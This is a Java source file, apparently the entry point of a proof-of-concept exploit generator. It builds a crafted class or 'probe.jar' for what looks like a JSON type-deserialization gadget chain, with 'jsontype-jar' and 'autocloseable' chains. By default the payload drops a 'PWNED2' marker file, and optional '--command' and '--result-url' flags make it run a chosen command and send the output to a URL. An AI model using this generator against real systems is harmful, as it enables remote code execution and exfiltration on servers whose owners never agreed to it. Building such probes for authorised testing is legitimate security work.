import java.io.File;

public class Gen {
    public static void main(String[] args) throws Exception {
        // Usage A: java Gen <internal-class-name> <output-class-file>
        // Usage B: java Gen --port 18080 --host localhost --out probe.jar
        if (args.length == 2 && !args[0].startsWith("--")) {
            String internalName = args[0];
            String outputFile = args[1];
            String pwned = System.getProperty("poc.pwnedFile", "PWNED2");
            java.nio.file.Files.write(java.nio.file.Paths.get(outputFile), CraftProbe.craftClass(internalName, pwned));
            System.out.println("crafted class written to " + outputFile);
            return;
        }

        int port = Integer.getInteger("poc.port", 18080);
        String host = System.getProperty("poc.hostToken", "localhost");
        String entry = System.getProperty("poc.entry", "POC");
        String pwned = System.getProperty("poc.pwnedFile", "PWNED2");
        File out = new File(System.getProperty("poc.probeJar", "probe.jar"));
        String protocol = "jar";
        String resource = "probe";
        String chain = "jsontype-jar";
        String format = "jar";
        String command = null;
        String resultUrl = null;

        for (int i = 0; i < args.length; i++) {
            if ("--port".equals(args[i]) && i + 1 < args.length) {
                port = Integer.parseInt(args[++i]);
            } else if ("--out".equals(args[i]) && i + 1 < args.length) {
                out = new File(args[++i]);
            } else if ("--host".equals(args[i]) && i + 1 < args.length) {
                host = args[++i];
            } else if ("--entry".equals(args[i]) && i + 1 < args.length) {
                entry = args[++i];
            } else if ("--protocol".equals(args[i]) && i + 1 < args.length) {
                protocol = args[++i];
            } else if ("--resource".equals(args[i]) && i + 1 < args.length) {
                resource = args[++i];
            } else if ("--chain".equals(args[i]) && i + 1 < args.length) {
                chain = args[++i];
            } else if ("--format".equals(args[i]) && i + 1 < args.length) {
                format = args[++i];
            } else if ("--command".equals(args[i]) && i + 1 < args.length) {
                command = args[++i];
            } else if ("--result-url".equals(args[i]) && i + 1 < args.length) {
                resultUrl = args[++i];
            }
        }

        boolean jsonType = chain.startsWith("jsontype");
        boolean autoCloseable = "autocloseable".equals(chain);
        String internalName = CraftProbe.internalName(protocol, host, port, resource, entry);
        if ("jar".equals(format)) {
            byte[] jar = CraftProbe.writeProbeJar(
                    out, protocol, host, port, resource, entry, pwned, jsonType, autoCloseable, command, resultUrl);
            System.out.println("crafted probe jar: " + out.getAbsolutePath() + " (" + jar.length + " bytes)");
        } else if ("class".equals(format)) {
            File parent = out.getAbsoluteFile().getParentFile();
            if (parent != null) {
                parent.mkdirs();
            }
            java.nio.file.Files.write(
                    out.toPath(), CraftProbe.craftClass(internalName, pwned, jsonType, autoCloseable, command, resultUrl));
            System.out.println("crafted probe class: " + out.getAbsolutePath());
        } else {
            throw new IllegalArgumentException("--format must be jar or class");
        }
        System.out.println("internalName: " + internalName);
        System.out.println("typeName: " + CraftProbe.typeName(protocol, host, port, resource, entry));
    }
}
